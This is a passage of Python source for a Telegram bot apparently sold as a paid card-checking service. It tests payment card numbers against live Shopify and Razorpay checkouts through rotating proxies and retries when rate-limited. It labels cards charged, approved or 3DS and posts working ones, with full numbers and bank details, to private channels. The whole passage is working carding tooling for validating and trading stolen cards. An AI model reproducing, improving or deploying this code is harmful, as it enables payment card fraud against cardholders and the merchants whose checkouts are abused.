    _JOIN_CACHE[user_id] = now
    return True


async def send_join_required_message(event):
    rows = []
    for _cid, name, link in FORCE_JOIN_CHATS:
        if link:
            rows.append([pbtn(bs(f"📢 Join {name}"), url=link,
                              style="primary", icon="📢")])
    rows.append([pbtn(bs("✅ I Joined"), data="check_joined",
                      style="success", icon="✅")])
    text = pe(f"""💎 <b>{bs('Access Locked')}</b>
{SEP}
💎 {bs('Join both chats to continue')}
{SEP}""")
    await styled_reply(event, text, buttons=rows)


async def force_join_check(event) -> bool:
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    await send_join_required_message(event)
    return False


async def check_maintenance(event) -> bool:
    if get_maintenance() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, pe(f"""💎 <b>{bs('Maintenance')}</b>
{SEP}
💎 <b>{bs('Bot under maintenance')}</b>
💎 <i>{bs('Try again later')}</i>"""))
        return True
    return False


async def send_premium_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Premium only')}</b>
{SEP}
💎 {bs('This command requires premium access')}
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
        buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                       style="success", icon="📩")]])


async def send_group_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Group only')}</b>
{SEP}
💎 {bs('Free users can only use in group')}
💎 <i>{bs('Upgrade for private access')}</i>"""))


# ====================== CLIENT ======================
client = TelegramClient('nova_bot', API_ID, API_HASH)
client_instance = client


# ====================== FREE-TIER TRACKER ======================
_FREE_USAGE = {}
_FREE_LAST = {}


def _today():
    return datetime.now().strftime("%Y-%m-%d")


def get_free_usage(user_id: int) -> int:
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 0}
        return 0
    return e["count"]


def inc_free_usage(user_id: int):
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 1}
    else:
        e["count"] += 1


def free_cooldown_left(user_id: int) -> float:
    last = _FREE_LAST.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_COOLDOWN_SEC:
        return 0.0
    return round(FREE_COOLDOWN_SEC - elapsed, 1)


def set_free_last(user_id: int):
    _FREE_LAST[user_id] = time.time()


# ====================== PREMIUM DAILY ======================
def load_premium_daily():
    return _read_json(PREMIUM_DAILY_FILE, {})


def save_premium_daily(d):
    _write_json(PREMIUM_DAILY_FILE, d)


def get_premium_daily_used(uid):
    d = load_premium_daily()
    e = d.get(str(uid), {})
    if e.get("date") != datetime.now().strftime("%Y-%m-%d"):
        return 0
    return e.get("count", 0)


def inc_premium_daily_used(uid):
    d = load_premium_daily()
    u = str(uid)
    today = datetime.now().strftime("%Y-%m-%d")
    e = d.get(u, {})
    if e.get("date") != today:
        e = {"date": today, "count": 1}
    else:
        e["count"] = e.get("count", 0) + 1
    d[u] = e
    save_premium_daily(d)


def get_premium_daily_limit(uid):
    lim = _read_json(USER_LIMITS_FILE, {})
    return int(lim.get(str(uid), 0))


# ====================== GLOBAL STATE ======================
ACTIVE_SESSIONS = {}
SHOPIFY_RESULTS = {}
RAZORPAY_RESULTS = {}
BOT_START_TIME = time.time()


# ====================== VIDEO SYSTEM ======================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "videos")
os.makedirs(VIDEO_DIR, exist_ok=True)


def get_welcome_video():
    p = os.path.join(VIDEO_DIR, "welcome.mp4")
    return p if os.path.exists(p) else None


def get_hit_videos():
    try:
        return [os.path.join(VIDEO_DIR, f)
                for f in sorted(os.listdir(VIDEO_DIR))
                if f.startswith("hit") and f.endswith(".mp4")]
    except Exception:
        return []


def _pick_hit_video():
    vids = get_hit_videos()
    return random.choice(vids) if vids else None


# ====================== CARD FORMATTING ======================
def _bin_lines(bin_tuple):
    brand, typ, level, bank, country, flag = bin_tuple
    return (
        f"{bs('BIN')} ━ <code>{brand} - {typ} - {level}</code>\n"
        f"{bs('Bank')} ━ <code>{bank}</code>\n"
        f"{bs('Country')} ━ <code>{country} {flag}</code>"
    )


def _status_header(status: str):
    s = (status or '').upper()
    if s == 'CHARGED':  return f"🥇 <b>{bs('CHARGED')}</b>"
    if s == 'APPROVED': return f"🥈 <b>{bs('APPROVED')}</b>"
    if s == '3DS':      return f"🥉 <b>{bs('3DS')}</b>"
    if s == 'DECLINED': return f"🥔 <b>{bs('DECLINED')}</b>"
    if s == 'ERROR':    return f"🧨 <b>{bs('ERROR')}</b>"
    return f"⚪ <b>{bs(s or 'UNKNOWN')}</b>"


def format_shopify_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_rz_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get("card", "-")
    gateway = result.get("gateway", "RazorPay")
    response = (result.get("message") or result.get("Response") or "")[:150]
    price = result.get("price", "-") or "-"
    status = (result.get("status") or "Dead").upper()
    if status == "DEAD":
        status = "DECLINED"
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_realtime_hit(result: dict, gateway_type: str, bin_tuple) -> str:
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}

💳 CC <code>{card}</code>

🛒 {bs('Gateway')} {gateway}
📝 {bs('Response')} {response}
💸 {bs('Price')} {price}

🆔 {bs('BIN Info')} {bin_tuple[0]} - {bin_tuple[1]} - {bin_tuple[2]}
🏦 {bs('Bank')} {bin_tuple[3]}
🥰 {bs('Country')} {bin_tuple[4]} {bin_tuple[5]}""")


HIT_BUTTON = [[pbtn(bs("💎 NOVA"), url="http://t.me/spectrumxchkbot",
                    style="primary", icon="💎")]]


async def send_realtime_hit(user_id: int, result: dict, hit_type: str,
                            user_name: str, gateway_type: str = "Shopify",
                            video_path: str = None):
    bin_tuple = await get_bin_info(result.get('card', '').split('|')[0])
    status = (result.get('status') or 'Dead').upper()
    text = format_realtime_hit(result, gateway_type, bin_tuple)

    if status == "CHARGED":
        text = pe(f"📌 <b>{bs('PINNED HIT — CHARGED')}</b>\n{text}")

    video_path = video_path or _pick_hit_video()
    try:
        sent = None
        if video_path and os.path.exists(video_path):
            sent = await send_file_entities(user_id, video_path, text,
                                            buttons=HIT_BUTTON, supports_streaming=True)
        if sent is None:
            sent = await send_entities(user_id, text, buttons=HIT_BUTTON)
        if status == "CHARGED" and sent:
            try:
                await client_instance.pin_message(user_id, sent.id, notify=False)
            except Exception:
                pass
    except Exception as e:
        log_system("HIT_DM", f"user {user_id}: {e}", "error")


# ====================== SHOPIFY CHECK ======================
async def check_card_shopify(card: str, site: str, proxy: str = None, http_session=None):
    if proxy:
        proxy = _strip_country_from_proxy(proxy)

    if not CHECKOUT_ENGINE_OK:
        return {'status': 'Error',
                'message': f'engine missing: {_CHECKOUT_IMPORT_ERR}',
                'card': card, 'site': site, 'gateway': 'Shopify',
                'price': '-', 'price_value': 0.0,
                'proxy': proxy, 'status_code': 'ENGINE_MISSING',
                'retryable': False}, proxy

    parts = card.split('|')
    if len(parts) != 4:
        return {'status': 'Dead', 'message': 'Invalid format',
                'card': card, 'site': site, 'gateway': 'Shopify',
                'price': '-', 'price_value': 0.0,
                'proxy': proxy, 'status_code': 'CARD_INVALID',
                'retryable': False}, proxy

    proxy_url = proxy_to_url(proxy) if proxy else ""
    site_clean = re.sub(r'^https?://', '', site).rstrip('/')
    if not site_clean.startswith(('http://', 'https://')):
        site_clean = 'https://' + site_clean

    loop = asyncio.get_running_loop()
    try:
        result = await loop.run_in_executor(
            None, run_checkout_public, site_clean, card, proxy_url, True
        )
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {'status': 'Error', 'message': str(e)[:120],
                'card': card, 'site': site, 'gateway': 'Shopify',
                'price': '-', 'price_value': 0.0,
                'proxy': proxy, 'status_code': 'EXCEPTION',
                'retryable': True}, proxy

    result['site'] = site
    return result, proxy


async def check_card_with_retry(card: str, sites: list, proxies: list,
                                max_retries: int = 2, rotator=None, http_session=None):
    if not sites:
        return {'status': 'Error', 'message': 'No sites', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
                'retryable': False}, None
    if not proxies:
        return {'status': 'Error', 'message': 'No proxies', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
                'retryable': False}, None

    rotator = rotator or SmartRotator()
    tried_sites, tried_proxies = set(), set()
    last_result, last_proxy = None, None

    ranked_sites = _get_active_sites(sites)
    if ranked_sites:
        sites = ranked_sites

    for attempt in range(max_retries):
        site = rotator.pick_site(sites, exclude=tried_sites)
        if not site:
            tried_sites.clear()
            site = rotator.pick_site(sites)
        if not site:
            break
        tried_sites.add(site)

        proxy = await _pick_smart_proxy(card, proxies)
        if not proxy or proxy in tried_proxies:
            proxy = rotator.pick_proxy(proxies, exclude=tried_proxies)
        if proxy:
            tried_proxies.add(proxy)
        last_proxy = proxy

        result, used_proxy = await check_card_shopify(card, site, proxy, http_session)
        last_proxy = used_proxy or last_proxy
        last_result = result

        status = result.get('status', 'Dead')
        retryable = result.get('retryable', False)
        msg = (result.get('message') or '').lower()

        try:
            _site_report(site, status)
        except Exception:
            pass

        if status in ('Charged', 'Approved', '3DS'):
            return result, last_proxy
        if status == 'Dead' and not retryable:
            return result, last_proxy
        if 'no variant' in msg:
            return result, last_proxy

        if '429' in msg or 'rate limit' in msg or 'throttl' in msg:
            await asyncio.sleep(10 + random.random() * 5)
        else:
            await asyncio.sleep(0)

    return last_result or {'status': 'Error', 'message': 'All attempts failed',
                           'card': card, 'gateway': 'Unknown',
                           'price': '-', 'price_value': 0.0,
                           'retryable': True}, last_proxy


# ====================== RAZORPAY CHECK ======================
def _rz_normalize(result: dict, card: str, proxy: str) -> dict:
    ok = result.get("ok", False)
    status_raw = result.get("status", "Dead")
    msg = result.get("message") or result.get("response") or "Unknown"

    if ok:
        status = "Charged"
    elif status_raw in ("Charged", "Approved", "3DS"):
        status = status_raw
    elif status_raw == "Error":
        status = "Error"
    else:
        status = "Dead"

    return {
        "status": status,
        "Response": msg,
        "message": msg,
        "Price": "-",
        "price": "-",
        "price_value": 0.0,
        "Gateway": "RazorPay",
        "gateway": "RazorPay",
        "card": card,
        "site": result.get("site", ""),
        "proxy": proxy,
        "status_code": status,
        "retryable": status == "Error",
        "duration_ms": int(result.get("time", 0) * 1000),
    }


async def check_rz_card(card: str, proxy: str = None, http_session=None, site: str = None):
    if not RAZORPAY_ENGINE_OK:
        return {"status": "Error", "message": f"razorpay engine missing: {_RZ_IMPORT_ERR}",
                "Response": f"razorpay engine missing: {_RZ_IMPORT_ERR}",
                "card": card, "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": False,
                "proxy": proxy, "status_code": "ENGINE_MISSING"}, proxy

    if not site:
        sites = load_rz_sites()
        if not sites:
            return {"status": "Error", "message": "No Razorpay sites configured",
                    "Response": "No Razorpay sites configured",
                    "card": card, "Gateway": "RazorPay", "gateway": "RazorPay",
                    "price": "-", "price_value": 0.0, "retryable": False,
                    "proxy": proxy, "status_code": "NO_RZ_SITES"}, proxy
        site = sites[0]

    proxy_url = proxy_to_url(proxy) if proxy else ""

    loop = asyncio.get_running_loop()
    try:
        result = await loop.run_in_executor(
            None, _rz_run_public, site, card, proxy_url
        )
    except Exception as e:
        return {"status": "Error", "message": str(e)[:150],
                "Response": str(e)[:150], "card": card,
                "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": True,
                "proxy": proxy, "status_code": "EXCEPTION"}, proxy

    result["site"] = site
    return _rz_normalize(result, card, proxy), proxy


async def check_rz_with_retry(card: str, proxies: list, max_retries: int = 2,
                              rotator=None, http_session=None, sites: list = None):
    if not RAZORPAY_ENGINE_OK:
        return {"status": "Error", "message": f"razorpay engine missing: {_RZ_IMPORT_ERR}",
                "Response": f"razorpay engine missing", "card": card,
                "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": False}, None

    if not sites:
        sites = load_rz_sites()
    if not sites:
        return {"status": "Error", "message": "No Razorpay sites",
                "Response": "No Razorpay sites",
                "card": card, "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": False}, None
    if not proxies:
        return {"status": "Error", "message": "No proxies",
                "Response": "No proxies",
                "card": card, "Gateway": "RazorPay", "gateway": "RazorPay",
                "price": "-", "price_value": 0.0, "retryable": False}, None

    tried_sites, tried_proxies = set(), set()
    last_result, last_proxy = None, None

    for attempt in range(max_retries):
        site = (rotator.pick_site(sites, exclude=tried_sites) if rotator
                else random.choice(sites))
        if not site:
            break
        tried_sites.add(site)

        proxy = (rotator.pick_proxy(proxies, exclude=tried_proxies) if rotator
                 else random.choice(proxies))
        if proxy:
            tried_proxies.add(proxy)
        last_proxy = proxy

        result, used_proxy = await check_rz_card(card, proxy, http_session, site=site)
        last_proxy = used_proxy or last_proxy
        last_result = result

        status = result.get("status", "Dead")
        if status in ("Charged", "Approved", "3DS"):
            return result, last_proxy
        if status == "Dead" and not result.get("retryable", False):
            return result, last_proxy

        if attempt < max_retries - 1:
            await asyncio.sleep(1 + random.random())

    return last_result or {"status": "Error", "message": "All attempts failed",
                           "Response": "All attempts failed", "card": card,
                           "Gateway": "RazorPay", "gateway": "RazorPay",
                           "price": "-", "price_value": 0.0, "retryable": True}, last_proxy


# ====================== PROXY TEST ======================
async def test_proxy(proxy: str):
    proxy_url = proxy_to_url(proxy)
    session = await get_proxy_session()
    try:
        async with session.get(
            "https://cdn.shopify.com/",
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=10, connect=6),
            allow_redirects=False,
        ) as r:
            if r.status in (200, 301, 302, 401, 403, 404):
                if ENGINE_PROXY_CHECK_OK and _engine_proxy_alive is not None:
                    try:
                        loop = asyncio.get_running_loop()
                        ok = await loop.run_in_executor(
                            None, _engine_proxy_alive, proxy_url, 6.0
                        )
                        if not ok:
                            return {'proxy': proxy, 'status': 'dead',
                                    'reason': 'engine TLS check failed'}
                    except Exception as e:
                        log_system("PROXY_ENGINE_CHECK",
                                   f"{proxy[:40]}: {e!r}", "warning")
                        return {'proxy': proxy, 'status': 'dead',
                                'reason': f'engine check error: {type(e).__name__}'}
                ip = '?'
                try:
                    async with session.get(
                        'https://api.ipify.org?format=json',
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=6, connect=4),
                    ) as ir:
                        if ir.status == 200:
                            data = await ir.json(content_type=None)
                            ip = data.get('ip', '?')
                except Exception:
                    pass
                return {'proxy': proxy, 'status': 'alive', 'ip': ip}
            if r.status == 407:
                return {'proxy': proxy, 'status': 'dead',
                        'reason': 'proxy auth required (407)'}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead',
                'reason': f'{type(e).__name__}: {str(e)[:60]}'}
    return {'proxy': proxy, 'status': 'dead',
            'reason': 'no Shopify reachability'}


# ====================== SITE TEST ======================
async def test_site_with_price(site: str, proxy: str = None) -> dict:
    if not site:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': 'Empty site'}
    if not proxy:
        return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                'response': 'No proxy'}
    if not CHECKOUT_ENGINE_OK:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': 'Engine missing'}

    test_card = "4111111111111111|12|2030|123"
    proxy_url = proxy_to_url(proxy)
    site_clean = re.sub(r'^https?://', '', site).rstrip('/')
    if not site_clean.startswith(('http://', 'https://')):
        site_clean = 'https://' + site_clean

    min_price = get_min_price()
    max_price = get_threshold()

    loop = asyncio.get_running_loop()
    try:
        res = await loop.run_in_executor(
            None, run_checkout_public, site_clean, test_card, proxy_url, True
        )
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': str(e)[:60]}

    st = res.get('status', 'Error')
    msg = (res.get('message') or '')[:100]
    low = msg.lower()

    if st in ('Charged', 'Approved', '3DS', 'Dead'):
        try:
            price = float(res.get('price_value') or 0)
        except Exception:
            price = 0.0
        if price <= 0.0:
            return {'site': site, 'status': 'alive', 'price': 0.0,
                    'response': f'Site OK ({msg or "reached"})'}
        if price < min_price:
            return {'site': site, 'status': 'dead', 'price': price,
                    'response': f'Below ${min_price:.2f}'}
        if price > max_price:
            return {'site': site, 'status': 'over', 'price': price,
                    'response': f'Over ${max_price:.2f}'}
        return {'site': site, 'status': 'alive', 'price': price,
                'response': f'${price:.2f} ✓'}

    if any(k in low for k in ('proxy', '407', 'curl: (7)', 'tunnel',
                              'could not resolve proxy', 'proxy_dead')):
        return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                'response': f'Proxy: {msg[:60]}'}
    if any(k in low for k in ('timeout', 'curl: (28)')):
        return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                'response': 'Timeout'}
    if any(k in low for k in ('rate', '429', 'too many', 'throttl')):
        return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                'response': 'Rate limited by Shopify (429)'}
    if 'no products' in low or 'no available products' in low:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': 'No products'}
    if 'products.json' in low:
        return {'site': site, 'status': 'dead', 'price': 0.0,
                'response': 'No products.json'}
    return {'site': site, 'status': 'dead', 'price': 0.0,
            'response': msg[:60] or 'Unreachable'}


# ====================== SITE TEST RUNNER ======================
async def _run_site_tests(event, uid, to_test, status_msg, initial_sites_count,
                          existing=None, wipe=False):
    threshold = get_threshold()
    proxies = load_user_proxies(uid)
    if not proxies:
        return await status_msg.edit(pe(f"💎 <b>{bs('Need proxies first')}</b>"))

    sem = get_user_sem(uid, "site")
    alive, dead, over, unknown, proxy_err = [], 0, 0, 0, 0
    checked = 0

    async def _check_one(site):
        nonlocal checked, dead, over, unknown, proxy_err
        proxy_choice = random.choice(proxies)
        clean = _strip_country_from_proxy(proxy_choice)
        async with sem:
            res = await test_site_with_price(site, clean)
        checked += 1
        st = res.get('status')
        reason = (res.get('response') or '')[:100]
        if st in ('alive', 'proxy_error'):
            log_system("SITE_TEST", f"{site} -> {st} | {reason}")
        if st == 'alive':
            alive.append(site)
        elif st == 'over':
            over += 1
        elif st == 'proxy_error':
            proxy_err += 1
        elif st == 'unknown':
            unknown += 1
        else:
            dead += 1

    try:
        for i in range(0, len(to_test), SITE_PER_USER_WORKERS):
            batch = to_test[i:i + SITE_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(s) for s in batch])
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Testing')}</b> [{checked}/{len(to_test)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{dead}</code> | "
                    f"🔌 <code>{proxy_err}</code> | 💰 <code>{over}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

        total_checked = proxy_err + dead + over + len(alive) + unknown
        majority_proxy = (total_checked > 0 and proxy_err >= total_checked)
        if (not wipe) and (proxy_err > 0) and (len(alive) == 0) and (over == 0) and majority_proxy:
            return await status_msg.edit(pe(
                f"🛑 <b>{bs('All requests failed at proxy layer')}</b>\n{SEP}\n"
                f"🔌 {bs('Proxy errors')}: <code>{proxy_err}</code>\n"
                f"❌ {bs('Dead')}: <code>{dead}</code>\n"
                f"💡 {bs('Replace proxies and retry')}"
            ), parse_mode='html', link_preview=False)

        if wipe:
            save_sites(alive)
        elif alive and existing is not None:
            save_sites(list(existing) + alive)

        await status_msg.edit(pe(
            f"✅ <b>{bs('Site check complete')}</b>\n{SEP}\n"
            f"📥 {bs('Received')}: <code>{initial_sites_count}</code>\n"
            f"✅ {bs('Alive')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead')}: <code>{dead}</code>\n"
            f"💰 {bs('Over threshold')}: <code>{over}</code>\n"
            f"🔌 {bs('Proxy errors')}: <code>{proxy_err}</code>\n"
            f"📁 {bs('Final sites.txt')}: <code>{len(load_sites())}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                               parse_mode='html')
    finally:
        cleanup_user_sem(uid)


# ====================== HIT TO CHANNEL ======================
async def send_hit_to_channel(card: str, status: str, response: str,
                              gateway: str, price: str = "-",
                              user_mention: str = None, user_id: int = None,
                              gateway_type: str = "Shopify",
                              site: str = None, proxy_used: str = None,
                              video_path: str = None):
    status_up = (status or '').upper()
    if status_up not in ("CHARGED", "APPROVED", "3DS"):
        return

    mention = user_mention or "User"
    video_path = video_path or _pick_hit_video()

    if HIT_CHANNEL_ID and HIT_CHANNEL_ID != -1000000000000:
        try:
            body = pe(f"""⭐ <b>{bs('HIT')}</b> ➛ <b>{bs(status_up)}</b>
{SEP}
⊀ {bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{(response or '')[:45]}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{bs('User')} ➛ {mention}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(
                        HIT_CHANNEL_ID, video_path, body,
                        buttons=HIT_BUTTON, supports_streaming=True)
                except Exception as e:
                    log_system("HIT_MAIN", f"video failed: {e}", "error")
            if sent is None:
                sent = await send_entities(HIT_CHANNEL_ID, body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(HIT_CHANNEL_ID, sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_MAIN", f"failed: {e}", "error")

    if CHARGED_ONLY_CHANNEL_ID and CHARGED_ONLY_CHANNEL_ID != -1000000000000:
        try:
            bin_tuple = await get_bin_info(card.split('|')[0])
            brand, typ, level, bank, country, flag = bin_tuple
            bin_disp = f"{brand} - {typ} - {level}" if brand != '-' else "N/A"
            bank_disp = bank if bank != '-' else "N/A"
            country_disp = f"{country} {flag}" if country != '-' else "N/A"
            site_disp = site or "N/A"
            uid_disp = f"<code>{user_id}</code>" if user_id else "N/A"
            proxy_line = f"\n{bs('Proxy')} ━ <code>{proxy_used}</code>" if proxy_used else ""
            date_full = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            status_label = f"{PE} {bs(status_up)}"

            body = pe(f"""{status_label}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Site')} ━ <code>{site_disp}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>{proxy_line}
{SEP}
{bs('BIN')} ━ <code>{bin_disp}</code>
{bs('Bank')} ━ <code>{bank_disp}</code>
{bs('Country')} ━ <code>{country_disp}</code>
{SEP}
{bs('User')} ➛ {mention} ({uid_disp})
{bs('Date')} ➛ {date_full}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(
                        CHARGED_ONLY_CHANNEL_ID, video_path, body,
                        buttons=HIT_BUTTON, supports_streaming=True)
                except Exception as e:
                    log_system("HIT_FULL", f"video failed: {e}", "error")
            if sent is None:
                sent = await send_entities(CHARGED_ONLY_CHANNEL_ID, body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(CHARGED_ONLY_CHANNEL_ID, sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_FULL", f"failed: {e}", "error")


# ====================== REDEEM LOG ======================
async def send_redeem_log(user_id: int, key: str, status: str, details: str = ""):
    if not REDEEM_LOG_CHANNEL_ID or REDEEM_LOG_CHANNEL_ID == -1000000000000:
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = f"@{sender.username}" if sender.username else f"User {user_id}"
    except Exception:
        username = f"User {user_id}"

    keys_data = load_keys()
    entry = keys_data.get(key, {})
    hours = entry.get("hours", DEFAULT_KEY_HOURS)
    try:
        hours = int(hours)
    except Exception:
        hours = DEFAULT_KEY_HOURS

    if hours < 24:
        plan_disp = f"{hours}.0h"
        exp_mins = hours * 60 - 1
        exp_h, exp_m = exp_mins // 60, exp_mins % 60
        exp_disp = f"{exp_h}h {exp_m:02d}m"
    else:
        days = hours // 24
        plan_disp = f"{days}.0d"
        exp_disp = f"{days - 1}d 23h 59m"

    ok = status.startswith("✅")
    emoji = "✅" if ok else "❌"
    body = pe(f"""{emoji} <b>{bs('Redeem Log')}</b> ➛ <b>{bs(status)}</b>
{SEP}
👤 <b>{bs('User')}</b> ⌁ {username} ⌁ <code>{user_id}</code>
🔑 <b>{bs('Key')}</b> ⌁ <code>{key}</code>
💎 <b>{bs('Plan')}</b> ⌁ <code>{plan_disp}</code>
⏰ <b>{bs('Expires')}</b> ⌁ <code>{exp_disp}</code>
📝 <b>{bs('Details')}</b> ⌁ <i>{details or '-'}</i>
{SEP}
{DEV_LINE}""")

    try:
        await send_entities(REDEEM_LOG_CHANNEL_ID, body, buttons=HIT_BUTTON)
    except Exception as e:
        log_system("REDEEM_LOG", f"send failed: {e}", "error")


# ====================== PROGRESS UI ======================
def _fmt_eta(seconds: float) -> str:
    if seconds <= 0 or seconds > 86400:
        return "—"
    seconds = int(seconds)
    h, m, s = seconds // 3600, (seconds % 3600) // 60, seconds % 60
    if h:
        return f"{h}h {m:02d}m"
    if m:
        return f"{m}m {s:02d}s"
    return f"{s}s"


def _build_bar(pct: int, length: int = 16) -> str:
    pct = max(0, min(100, pct))
    filled = int(round(length * pct / 100))
    return "▰" * filled + "▱" * (length - filled)


async def update_progress(user_id: int, message_id: int, results: dict,
                          current_checked: int, gateway_type: str = "Shopify"):
    total = results.get('total', 1) or 1
    checked = results.get('checked', 0)
    remaining = max(total - checked, 0)
    elapsed = max(0.0, time.time() - results.get('start_time', time.time()))
    h, m, s = int(elapsed) // 3600, (int(elapsed) % 3600) // 60, int(elapsed) % 60
    pct = int((checked / total) * 100) if total else 0
    bar = _build_bar(pct, 16)
    last_card = (results.get('last_card') or 'None')
    last_resp = (results.get('last_response') or 'Waiting...')[:22]
    last_price = (results.get('last_price') or '-')[:8]
    n_charged = len(results.get('charged', []))
    n_approved = len(results.get('approved', []))
    n_3ds = len(results.get('3ds', []))
    n_dead = len(results.get('dead', []))
    n_errors = len(results.get('errors', []))
    hits = n_charged + n_approved + n_3ds
    hit_rate = (hits / checked * 100.0) if checked > 0 else 0.0
    if checked > 0 and remaining > 0:
        rate = checked / elapsed if elapsed > 0 else 0
        eta_sec = (remaining / rate) if rate > 0 else 0
        eta_str = _fmt_eta(eta_sec)
    elif remaining == 0:
        eta_str = "done"
    else:
        eta_str = "—"
    cps = (checked / elapsed) if elapsed > 0 else 0.0

    text = pe(f"""💳 {bs('Card')}: <code>{last_card}</code>
📝 {bs('Response')}: <code>{last_resp}</code>
💰 {bs('Price')}: <code>{last_price}</code>
{SEP}
{bar}  <b>{pct}%</b>
{SEP}
🥇 {bs('Charged')}: {n_charged}   🥈 {bs('Approved')}: {n_approved}
🥉 {bs('3DS')}: {n_3ds}   🥔 {bs('Declined')}: {n_dead}
🧨 {bs('Errors')}: {n_errors}
{SEP}
📊 {checked}/{total}  ━  ⏳ {bs('Left')}: {remaining}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>  ━  ⚡ {cps:.1f}/s
⏱️ {h:02d}:{m:02d}:{s:02d}  ━  🕐 {bs('ETA')}: {eta_str}
""")

    prefix = "razorpay" if gateway_type.lower() == "razorpay" else "shopify"
    buttons = [
        [pbtn(f"🥇 {bs('Charged')} {n_charged}",
              data=f"{prefix}_export_charged:{user_id}", style="success", icon="🥇"),
         pbtn(f"🥈 {bs('Approved')} {n_approved}",
              data=f"{prefix}_export_approved:{user_id}", style="primary", icon="🥈")],
        [pbtn(f"🥉 {bs('3DS')} {n_3ds}",
              data=f"{prefix}_export_3ds:{user_id}", style="primary", icon="🥉"),
         pbtn(f"🧨 {bs('Errors')} {n_errors}",
              data=f"{prefix}_export_errors:{user_id}", style="danger", icon="🧨")],
        [pbtn(f"⛔ {bs('Stop')}", data=f"stop_{user_id}", style="danger", icon="⛔")],
    ]
    try:
        text_clean, ents = build_entities(text)
        await client_instance.edit_message(
            user_id, message_id, text_clean,
            formatting_entities=ents,
            buttons=buttons, link_preview=False)
    except Exception:
        pass


# ====================== RESULT FILE ======================
def _write_result_file(fname: str, title: str, items: list, gateway: str = "Shopify"):
    try:
        with open(fname, 'w', encoding='utf-8') as f:
            f.write(f"{title}\n")
            f.write(f"Gateway  : {gateway}\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total    : {len(items)}\n")
            f.write("=" * 50 + "\n\n")
            if not items:
                f.write("(no cards in this category)\n")
